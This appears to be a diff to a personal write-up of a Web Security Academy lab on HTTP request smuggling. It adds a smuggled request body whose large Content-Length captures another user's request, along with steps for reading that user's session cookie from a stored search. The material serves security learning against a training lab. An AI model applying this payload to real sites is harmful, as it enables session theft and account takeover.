@@ -480,7 +480,28 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-- 
+- ![image](https://github.com/user-attachments/assets/2508fc08-830d-4fb0-821d-e1614bb0b76d)
+- ![image](https://github.com/user-attachments/assets/e2786378-b2d5-4d4a-9574-c9c2d8903b23)
+- change the body of the request to the following
+
+```
+0
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=YOUR-SESSION-COOKIE
+Content-Length: 800
+
+search=x
+```
+
+- ![image](https://github.com/user-attachments/assets/434816eb-d089-4cf1-a7f8-6508d81ba6a9)
+- now we refresh the page and we can see it wrote the request as a recent search, getting the other users cookie value. (if in the response it's a `POST` you refreshed too early and need to try again to steal the users which should be a `GET` request):
+- ![image](https://github.com/user-attachments/assets/4097a559-1a3f-4181-b4f9-1d78ee9a8cd8)
+
+
+
+
 
 
 
